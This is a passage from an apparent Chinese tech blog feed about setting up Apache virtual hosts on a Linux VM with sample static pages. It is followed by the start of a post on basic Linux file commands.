class="line">[root@localhost /]# <span class="built_in">ls</span> -l /var/log/httpd</span><br><span class="line">总用量 4</span><br><span class="line">-rw-r--r--. 1 root root    0 8月   4 15:42 access_log</span><br><span class="line">-rw-r--r--. 1 root root 1036 8月   4 15:42 error_log</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查新增用户和组</span></span><br><span class="line">grep apache /etc/passwd</span><br><span class="line">grep apache /etc/group</span><br><span class="line"></span><br><span class="line">[root@localhost /]# grep apache /etc/group</span><br><span class="line">apache:x:48:</span><br><span class="line">[root@localhost /]# grep apache /etc/passwd</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br></pre></td></tr></table></figure><h2 id="4-搭建静态页面"><a href="#4-搭建静态页面" class="headerlink" title="4.搭建静态页面"></a>4.搭建静态页面</h2><p>以上我们已经搭建好apache服务，现在需要利用apache服务来搭建一个自己的网站</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#首先，需要将静态页面保存到apache的网站根目录/var/www/html下，名为index.html</span><br><span class="line">#以下是我自己的静态页面代码</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">135deg</span>, <span class="number">#f5f7fa</span> <span class="number">0%</span>, <span class="number">#c3cfe2</span> <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">3rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: fadeIn <span class="number">1.5s</span> ease-in-out;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> fadeIn &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">from</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">20px</span>);</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">to</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到HacerkT的世界<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存好之后，访问一下静态页面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看一下自己的ip地址</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="comment">#然后用浏览器直接访问ip地址，成功访问之后证明网站搭建完毕</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804161900808.png"></p><p>到此，网站已经搭建完毕！</p><h2 id="5-搭建第二网站"><a href="#5-搭建第二网站" class="headerlink" title="5.搭建第二网站"></a>5.搭建第二网站</h2><p>搭建第二网站需要运用到apache的一个核心功能，虚拟主机，他允许单台服务器通过不同ip、域名、端口托管多个不同网站</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三种方式</span><br><span class="line">基于域名：不同域名访问不同网站，如a.com和b.com</span><br><span class="line">基于ip：不同ip访问不同网站，如http://10.1.1.1和http://10.1.1.2</span><br><span class="line">基于端口：不同端口访问不同网站，如http://10.1.1.1:81和http://10.1.1.1:82</span><br></pre></td></tr></table></figure><p>这里我们使用域名来搭建第二网站</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建新的网站目录和日志目录，在/var/www下创建，例如/var/www/study/html和/var/www/study/log</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/www/study/html /var/www/study/log</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建日志文件，错误日志study_error.log和访问日志study_access.log</span></span><br><span class="line"><span class="built_in">touch</span> /var/www/study/log/study_error.log /var/www/study/log/study_access.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改配置文件，路径为/etc/httpd/conf.d目录下，创建一个新的配置文件，例如study.conf</span></span><br><span class="line">vim /etc/httpd/conf.d/study.conf</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">ServerName study.com <span class="comment"># 主域名</span></span><br><span class="line">ServerAlias study1.com <span class="comment"># 备用域名</span></span><br><span class="line">DocumentRoot /var/www/study/html <span class="comment"># 网站根目录</span></span><br><span class="line">ErrorLog /var/www/study/log/study_error.log <span class="comment"># 错误日志</span></span><br><span class="line">CustomLog /var/www/study/log/study_access.log combined <span class="comment"># 访问日志</span></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"><span class="comment">#需要注意，在配置文件的时候，不能加上#的内容，例如#主域名，这个要删除</span></span><br></pre></td></tr></table></figure><p>做完这些之后，写第二网站的静态页面，同之前一样，但这里注意网站的路径为&#x2F;var&#x2F;www&#x2F;study&#x2F;html，所以html文件保存在这个路径下，以下是我第二个网页的代码</p><p>这里需要注意一下，需要配置属主属组为apache，并配置权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> apache:apache /var/www/study/html/index.html</span><br><span class="line"><span class="built_in">chmod</span> 755 /var/www/study/html/index.html</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>网络安全学习路线基础篇<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-pseudo">:root</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--primary-color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--secondary-color</span>: <span class="number">#3498db</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--background-color</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--card-bg</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--text-color</span>: <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">var</span>(--background-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--text-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--primary-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2.5rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.module</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">var</span>(--card-bg);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">6px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.module</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">5px</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.module</span> <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--secondary-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="built_in">var</span>(--secondary-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style-type</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>网络安全学习路线基础篇<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1. 操作系统基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Windows<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Linux<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>2. 计算机网络基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>网络设备<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>协议<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>数据包<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>3. 数据库基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>MySQL<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>MSSQL<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Redis<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>4. 代码基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>PHP<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Python<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Java<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里出现几个问题，当我们使用域名study.com访问的时候，访问的是其他的网站</p><p>这里做了域名解析</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181159993.png"></p><p>可以看到是其他ip，原因可能是因为在浏览器解析域名的时候是公网的DNS服务器，所以无法定位到你的虚拟机，但是可以通过命令行进行访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Host: study.com&quot; http://192.168.xx.xx/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181518614.png"></p><p>成功访问！证明我们的配置没有问题</p><p>还有一个问题是，在浏览器上使用ip进行访问的时候，访问的是第二网页，那么我们之前通过ip访问的第一网页去哪了呢？？？？？</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181718943.png"></p><p>原因是因为你在apache上开启了虚拟主机这个配置，并且配置了域名，让你的ip有了一个指向，目标就是你的域名，所以它会自动将域名和ip绑定，访问的路径自然就是你第二网页的路径&#x2F;var&#x2F;www&#x2F;study&#x2F;heml而不是默认网页&#x2F;var&#x2F;www&#x2F;html，所以就造成了当浏览器输入IP进行访问的时候，访问的是你的第二网页。</p><p>那有什么办法能访问到两个网页呢？？？？</p><p>当然有，这需要做一个配置，新建一个虚拟配置文件，让这个配置文件指向你的默认页面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">新建一个index.conf的配置文件，在/etc/httpd/conf.d/目录下</span><br><span class="line">vim /etc/httpd/conf.d/index.conf</span><br><span class="line"></span><br><span class="line">保存一下内容</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    <span class="comment"># 使用通配符&quot;_&quot;表示默认主机</span></span><br><span class="line">    ServerName _</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明确指向Apache的默认目录</span></span><br><span class="line">    DocumentRoot /var/www/html</span><br><span class="line"></span><br><span class="line">    &lt;Directory <span class="string">&quot;/var/www/html&quot;</span>&gt;</span><br><span class="line">        Options -Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>配置好后，编辑你的物理机的”C:\Windows\System32\drivers\etc\hosts”配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在末尾加上</span><br><span class="line"></span><br><span class="line">192.168.x.x  study.com www.study.com</span><br><span class="line"></span><br><span class="line">192.168.x.x是你虚拟机服务器的ip地址</span><br></pre></td></tr></table></figure><p>配置完成之后，去浏览器清理dns缓存，直接ctrl+shift+delete</p><p>然后在命令行里输入，ipconfig &#x2F;flushdns，刷新dns解析缓存</p><p>然后再次尝试在浏览器通过域名和ip进行访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250805110853545.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250805110927235.png"></p><p>OK，成功解决，ip和域名访问不冲突，当然还有一些其他的解决方式，比如修改&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf文件</p><p>到此，本章内容结束！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>“Linux常用基础命令”</title>
      <link href="/2025/08/04/%E2%80%9CLinux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E2%80%9D/"/>
      <url>/2025/08/04/%E2%80%9CLinux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="linux常用基础命令"><a href="#linux常用基础命令" class="headerlink" title="linux常用基础命令"></a>linux常用基础命令</h1><h2 id="一、文件管理与查询"><a href="#一、文件管理与查询" class="headerlink" title="一、文件管理与查询"></a>一、文件管理与查询</h2><h3 id="1-touch-创建文件"><a href="#1-touch-创建文件" class="headerlink" title="1.touch #创建文件"></a>1.touch #创建文件</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> test.txt  <span class="comment">#单个创建</span></span><br><span class="line"><span class="built_in">touch</span> test1.txt test2.txt  <span class="comment">#批量创建</span></span><br></pre></td></tr></table></figure><h3 id="2-mkdir-创建目录"><a href="#2-mkdir-创建目录" class="headerlink" title="2.mkdir #创建目录"></a>2.mkdir #创建目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> 【选项】 目录名</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">dir</span>/  <span class="comment">#单级创建</span></span><br><span class="line"><span class="built_in">mkdir</span> -p dir1/dir2  <span class="comment">#递归创建</span></span><br></pre></td></tr></table></figure><h3 id="3-rm-删除文件及目录"><a href="#3-rm-删除文件及目录" class="headerlink" title="3.rm #删除文件及目录"></a>3.rm #删除文件及目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> 【选项】 文件名or目录名</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> test.txt  <span class="comment">#删除单个文件</span></span><br><span class="line"><span class="built_in">rm</span> -r <span class="built_in">dir</span>/  <span class="comment">#删除整个目录及其以下所有内容</span></span><br><span class="line"><span class="built_in">rm</span> -f test.txt  <span class="comment">#强制删除</span></span><br></pre></td></tr></table></figure><h3 id="4-cp-复制文件或目录"><a href="#4-cp-复制文件或目录" class="headerlink" title="4.cp #复制文件或目录"></a>4.cp #复制文件或目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> 【选项】 文件名or目录名 指定路径</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> test.txt <span class="built_in">dir</span>/  <span class="comment">#将test.txt复制到dir/目录</span></span><br><span class="line"><span class="built_in">cp</span> -r dir1/ dir2/  <span class="comment">#将dir1递归复制到dir2</span></span><br><span class="line"><span class="built_in">cp</span> -f dir1/ dir2/  <span class="comment">#强制复制</span></span><br><span class="line"><span class="built_in">cp</span> -i test.txt dir1/  <span class="comment">#若有覆盖，提示确认</span></span><br></pre></td></tr></table></figure><h3 id="5-mv-移动文件或重命名"><a href="#5-mv-移动文件或重命名" class="headerlink" title="5.mv #移动文件或重命名"></a>5.mv #移动文件或重命名</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 源文件 目标路径or名称</span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> old.txt nwe.txt  <span class="comment">#重命名</span></span><br><span class="line"><span class="built_in">mv</span> test.txt <span class="built_in">dir</span>/  <span class="comment">#移动test.txt到dir/目录</span></span><br></pre></td></tr></table></figure><h3 id="6-ls-查看目录"><a href="#6-ls-查看目录" class="headerlink" title="6.ls #查看目录"></a>6.ls #查看目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> 【选项】</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span>  <span class="comment">#查看当前目录下所有文件</span></span><br><span class="line"><span class="built_in">ls</span> -a  <span class="comment">#显示当前目录下的隐藏文件</span></span><br><span class="line"><span class="built_in">ls</span> -l  <span class="comment">#长格式显示，显示各文件权限、所属主/组、时间等</span></span><br><span class="line"><span class="built_in">ls</span> -h  <span class="comment">#人类可读的文件大小</span></span><br><span class="line"><span class="built_in">ls</span> -R  <span class="comment">#递归显示子目录</span></span><br></pre></td></tr></table></figure><h3 id="7-cat-查看文件"><a href="#7-cat-查看文件" class="headerlink" title="7.cat #查看文件"></a>7.cat #查看文件</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 【选项】 文件名</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> test.txt  <span class="comment">#查看test.txt文件的内容</span></span><br><span class="line"><span class="built_in">cat</span> test1.txt test2.txt  <span class="comment">#查看多个文件内容</span></span><br><span class="line"><span class="built_in">cat</span> test1.txt test2.txt &gt; test3.txt  <span class="comment">#合并文件 </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> -n  <span class="comment">#显示行号</span></span><br><span class="line"><span class="built_in">cat</span> -b  <span class="comment">#显示行号（忽略空行）</span></span><br><span class="line"><span class="built_in">cat</span> -s  <span class="comment">#压缩连续空行为一行</span></span><br><span class="line"><span class="built_in">cat</span> -E  <span class="comment">#在行尾显示$符号</span></span><br></pre></td></tr></table></figure><p>高阶用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">创建文件</span><br><span class="line"><span class="built_in">cat</span> &gt; test.txt &lt;&lt; <span class="string">EOF  #创建test.txt文件</span></span><br><span class="line"><span class="string">示例</span></span><br><span class="line"><span class="string">[root@localhost test]# cat &gt; test789.txt &lt;&lt;EOF</span></span><br><span class="line">&gt; qwer</span><br><span class="line">&gt; EOF</span><br><span class="line">[root@localhost <span class="built_in">test</span>]# <span class="built_in">cat</span> test789.txt </span><br><span class="line">qwer</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> test1.txt &gt; test2.txt  <span class="comment">#将test1的内容追加到test2末尾</span></span><br></pre></td></tr></table></figure><h3 id="8-tail-查看文件末尾内容"><a href="#8-tail-查看文件末尾内容" class="headerlink" title="8.tail #查看文件末尾内容"></a>8.tail #查看文件末尾内容</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> 【选项】 文件名</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> test.txt  <span class="comment">#查看末尾10行内容</span></span><br><span class="line"><span class="built_in">tail</span> -n 20 test.txt  <span class="comment">#查看末尾20行，-n用于指定显示行数</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/message  <span class="comment">#实时追踪变化</span></span><br></pre></td></tr></table></figure><h3 id="9-grep-进行正则匹配文本内容"><a href="#9-grep-进行正则匹配文本内容" class="headerlink" title="9.grep #进行正则匹配文本内容"></a>9.grep #进行正则匹配文本内容</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep 【选项】 “搜索模式” 文件名or目录</span><br><span class="line"></span><br><span class="line">grep -i <span 